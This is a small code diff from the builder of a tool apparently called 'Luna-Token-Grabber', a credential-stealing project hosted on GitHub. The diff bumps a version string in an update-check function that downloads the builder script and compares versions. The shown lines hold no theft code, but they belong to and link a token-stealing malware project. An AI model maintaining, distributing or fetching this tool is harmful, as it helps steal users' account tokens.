@@ -6,7 +6,7 @@ import requests
 
 
 def check_update():
-    version_string = "VERSION = '1.2.3'"
+    version_string = "VERSION = '1.2.4'"
     code = requests.get('https://raw.githubusercontent.com/Smug246/Luna-Token-Grabber/main/builder.pyw').text
     if version_string in code:
         print('This version is up to date!')
